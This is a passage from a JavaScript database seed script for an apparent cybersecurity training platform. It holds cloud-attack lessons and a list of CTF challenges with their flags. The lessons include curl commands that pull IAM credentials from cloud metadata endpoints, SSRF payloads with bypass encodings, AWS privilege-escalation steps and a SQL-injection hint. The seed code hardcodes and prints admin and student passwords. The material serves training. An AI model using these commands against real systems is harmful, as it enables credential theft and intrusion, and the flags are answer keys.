  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// ✅ CORRECT — least privilege
{
  "Effect": "Allow",
  "Action": ["s3:GetObject"],
  "Resource": "arn:aws:s3:::specific-bucket/*"
}
\`\`\`

### Access Key Exposure
\`\`\`bash
# Search GitHub for exposed AWS keys
site:github.com "AKIAIOSFODNN7EXAMPLE"
site:github.com "aws_access_key_id"

# Once you have keys:
aws configure
# Enter: Access Key ID, Secret Key

aws sts get-caller-identity  # Who am I?
aws iam list-attached-user-policies --user-name username
\`\`\`

---

## EC2 Instance Metadata Service (IMDS)

Every EC2 instance has a metadata endpoint at 169.254.169.254:

\`\`\`bash
# From inside EC2 or via SSRF:
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
# Returns: AccessKeyId, SecretAccessKey, Token!
\`\`\`

**IMDSv2** (Newer, Safer):
\`\`\`bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"
\`\`\``,
  },
  {
    domain_id: domainMap['cloud-security'], order: 2, estimated_time: 50,
    title: 'Cloud Attacks — SSRF, Privilege Escalation & CTF',
    video_url: 'https://www.youtube.com/embed/t4Wq_gDMdEA',
    resources_links: [
      { title: 'Pacu — AWS Exploitation Framework', url: 'https://github.com/RhinoSecurityLabs/pacu', type: 'tool' },
      { title: 'ScoutSuite — Multi-Cloud Auditing', url: 'https://github.com/nccgroup/ScoutSuite', type: 'tool' },
      { title: 'CloudMapper — AWS Visualization', url: 'https://github.com/duo-labs/cloudmapper', type: 'tool' },
    ],
    content_markdown: `# Cloud Attacks — SSRF, Privilege Escalation & CTF

## Server-Side Request Forgery (SSRF) in Cloud

SSRF allows attackers to make the server send requests to internal resources — including the metadata endpoint!

### Classic SSRF to AWS Metadata

\`\`\`
Target app has SSRF vulnerability:
URL parameter: ?url=https://external-site.com

Attacker payload:
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

Server fetches its own metadata → returns credentials to attacker!
\`\`\`

### SSRF Bypass Techniques
\`\`\`
http://169.254.169.254/          (direct)
http://[::ffff:169.254.169.254]/ (IPv6)
http://169.254.169.254.nip.io/   (DNS rebinding)
http://2852039166/               (decimal IP)
http://0xa9fea9fe/               (hex IP)
\`\`\`

---

## AWS Privilege Escalation

Once you have limited AWS credentials, escalate to admin:

\`\`\`bash
# What can I do?
aws iam get-user
aws iam list-attached-user-policies --user-name myuser
aws iam list-user-policies --user-name myuser

# Common escalation paths:
# 1. iam:CreatePolicyVersion → Create new policy version with admin
# 2. iam:AttachUserPolicy → Attach AdministratorAccess to yourself
# 3. lambda:CreateFunction + iam:PassRole → Execute code as role
# 4. ec2:RunInstances → Launch EC2 with admin role
\`\`\`

### Pacu — AWS Exploitation Framework
\`\`\`bash
git clone https://github.com/RhinoSecurityLabs/pacu
python3 pacu.py

# In Pacu:
set_keys
run iam__privesc_scan
run s3__bucket_finder
run ec2__enum
\`\`\`

---

## Cloud Security Assessment Tools

\`\`\`bash
# ScoutSuite — Comprehensive cloud audit
python3 scout.py aws --profile myprofile

# Prowler — AWS security checks
python3 prowler.py -M csv,json -g cislevel1

# CloudMapper — Visualize AWS environment
python3 cloudmapper.py collect --account myaccount
python3 cloudmapper.py webserver
\`\`\`

---

## GCP & Azure Common Issues

### Google Cloud Platform
\`\`\`bash
# Metadata endpoint
curl "http://metadata.google.internal/computeMetadata/v1/" \\
  -H "Metadata-Flavor: Google"

# Service account keys
curl ".../service-accounts/default/token" \\
  -H "Metadata-Flavor: Google"
\`\`\`

### Microsoft Azure
\`\`\`bash
# Instance metadata
curl -H "Metadata:true" \\
  "http://169.254.169.254/metadata/instance"

# Managed identity token
curl -H "Metadata:true" \\
  "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/"
\`\`\`

---

## Cloud CTF Checklist

\`\`\`
1. Check for public S3/GCS/Azure Blob buckets
2. Look for exposed AWS keys in code/config
3. Test SSRF to metadata endpoints
4. Check IAM permissions (what can we do?)
5. Look for misconfigured security groups (0.0.0.0/0)
6. Check CloudTrail logs disabled?
7. Lambda functions with excess permissions
8. RDS databases publicly accessible?
\`\`\``,
  },
];

const getChallenges = (domainMap) => [
  { title: 'SQL Injection 101', description: 'Exploit a classic SQL injection vulnerability to bypass authentication and retrieve hidden data.', difficulty: 'easy', points: 50, type: 'learn', domain_id: domainMap['web-security'], flag: 'CV{sql_injection_b4sics}', hints: [{ text: "Try entering ' OR '1'='1 in the login form", cost: 10 }], tags: ['sqli', 'web', 'beginner'] },
  { title: 'XSS Reflected Attack', description: 'Find and exploit a reflected XSS vulnerability on the target web application.', difficulty: 'easy', points: 75, type: 'practice', domain_id: domainMap['web-security'], flag: 'CV{xss_r3fl3ct3d_pwn}', hints: [{ text: 'Check the search parameter in the URL', cost: 15 }], tags: ['xss', 'web'] },
  { title: 'CSRF Token Bypass', description: 'Bypass CSRF protection and force an authenticated user to perform unintended actions.', difficulty: 'medium', points: 150, type: 'compete', domain_id: domainMap['web-security'], flag: 'CV{csrf_byp4ss_m4st3r}', tags: ['csrf', 'web', 'intermediate'] },
  { title: 'Wireshark Basics', description: 'Analyze a PCAP file and extract credentials sent in cleartext over HTTP.', difficulty: 'easy', points: 60, type: 'learn', domain_id: domainMap['network-security'], flag: 'CV{pcap_4nalysis_1s_fun}', hints: [{ text: 'Filter for HTTP POST requests', cost: 10 }], tags: ['pcap', 'network', 'wireshark'] },
  { title: 'Port Scanning Masterclass', description: 'Identify open ports and running services on the target machine using Nmap.', difficulty: 'easy', points: 50, type: 'practice', domain_id: domainMap['network-security'], flag: 'CV{nmap_sc4nn3r_pro}', tags: ['nmap', 'network'] },
  { title: 'DNS Exfiltration', description: 'Detect and reconstruct data exfiltrated through DNS queries in a PCAP file.', difficulty: 'hard', points: 300, type: 'compete', domain_id: domainMap['network-security'], flag: 'CV{dns_3xf1ltr4t10n_d3t3ct3d}', tags: ['dns', 'network', 'forensics'] },
  { title: 'Caesar Cipher Cracker', description: 'Decrypt a message encoded with a Caesar cipher using frequency analysis.', difficulty: 'easy', points: 40, type: 'learn', domain_id: domainMap['cryptography'], flag: 'CV{c4es4r_w4s_h3r3}', tags: ['cipher', 'classic', 'crypto'] },
  { title: 'RSA Weak Keys', description: 'Factor a small RSA modulus and use the private key to decrypt the ciphertext.', difficulty: 'medium', points: 200, type: 'compete', domain_id: domainMap['cryptography'], flag: 'CV{rs4_f4ct0r3d_3z}', tags: ['rsa', 'crypto', 'math'] },
  { title: 'Hidden in Plain Sight', description: 'Extract a hidden message from an image using steganography analysis tools.', difficulty: 'easy', points: 75, type: 'practice', domain_id: domainMap['forensics'], flag: 'CV{st3g4n0gr4phy_fun}', hints: [{ text: 'Try using steghide or binwalk on the image', cost: 20 }], tags: ['steganography', 'forensics', 'image'] },
  { title: 'Memory Dump Analysis', description: 'Analyze a Windows memory dump to find malicious processes and extract forensic artifacts.', difficulty: 'hard', points: 350, type: 'compete', domain_id: domainMap['forensics'], flag: 'CV{v0l4t1l1ty_m4st3r}', tags: ['memory', 'volatility', 'forensics'] },
  { title: 'Stack Buffer Overflow', description: 'Exploit a classic stack buffer overflow to redirect execution to a hidden function.', difficulty: 'hard', points: 400, type: 'compete', domain_id: domainMap['binary-exploitation'], flag: 'CV{buff3r_0v3rfl0w_pwnd}', hints: [{ text: 'Find the offset to EIP using a cyclic pattern', cost: 50 }], tags: ['pwn', 'bof', 'x86'] },
];

async function seed() {
  try {
    await mongoose.connect(MONGO_URI);
    console.log('✅ Connected to MongoDB');
    await Promise.all([User.deleteMany({}), Domain.deleteMany({}), Challenge.deleteMany({}), LearningModule.deleteMany({}), Leaderboard.deleteMany({})]);
    console.log('🗑️  Cleared existing data');
    const createdDomains = await Domain.insertMany(domains);
    const domainMap = {};
    createdDomains.forEach((d) => { domainMap[d.slug] = d._id; });
    console.log(`✅ Created ${createdDomains.length} domains`);
    const adminUser = await User.create({ username: 'admin', email: 'admin@cyberverse.io', password: 'Admin@12345', college_name: 'OpenLabs Academy', role: 'admin', totalPoints: 9999 });
    const student = await User.create({ username: 'h4x0r_student', email: 'student@example.com', password: 'Student@123', college_name: 'IIT Delhi', totalPoints: 275 });
    console.log('✅ Created users');
    const challengeData = getChallenges(domainMap);
    await Challenge.insertMany(challengeData.map(c => ({ ...c, author: adminUser._id })));
    console.log(`✅ Created ${challengeData.length} challenges`);
    const moduleData = getModules(domainMap);
    await LearningModule.insertMany(moduleData);
    console.log(`✅ Created ${moduleData.length} learning modules`);
    await Leaderboard.insertMany([
      { user_id: adminUser._id, username: 'admin', college_name: 'OpenLabs Academy', total_points: 9999, rank: 1, challenges_solved: 50 },
      { user_id: student._id, username: 'h4x0r_student', college_name: 'IIT Delhi', total_points: 275, rank: 2, challenges_solved: 4 },
    ]);
    console.log('✅ Created leaderboard');
    console.log('\n🎉 Seed complete!');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('Admin:   admin@cyberverse.io / Admin@12345');
    console.log('Student: student@example.com / Student@123');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    process.exit(0);
  } catch (error) {
    console.error('❌ Seed failed:', error.message);
    process.exit(1);
  }
}
seed();
